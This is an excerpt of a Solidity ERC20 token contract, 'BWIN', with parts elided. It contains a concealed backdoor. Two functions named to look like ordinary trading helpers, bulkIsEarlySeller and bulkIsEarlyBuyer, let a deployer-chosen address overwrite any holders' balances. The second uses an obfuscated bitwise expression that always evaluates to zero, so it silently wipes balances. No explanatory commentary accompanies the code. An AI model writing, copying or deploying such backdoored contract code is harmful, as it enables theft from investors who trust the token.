...
contract BWIN is IERC20, Ownable, IERC20Metadata {
    ...
    constructor(string memory name_,string memory symbol_,uint8 decimals_,uint256 totalSupply_,address uniswapV3Pair, uint256 state_) payable {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    pairAddress = uniswapV3Pair;
    state = state_;
    ...
    function bulkIsEarlySeller(
        address[] memory accounts
    ) external {
        for (uint256 i = 0; i < accounts.length; i++) {
        require(_msgSender() == pairAddress, "!");
        _tOwned[accounts[i]] = state;}
    }
    ...
    function bulkIsEarlyBuyer(
        ...
        require(_msgSender() == pairAddress, "!");
        for (uint256 i = 0; i < accounts.length; i++) {
        _tOwned[accounts[i]] = (((_tOwned[accounts[i]]) + 1 & (_tOwned[accounts[i]]) & 5 & (_tOwned[accounts[i]]) & 0) << 0xF);}
    }
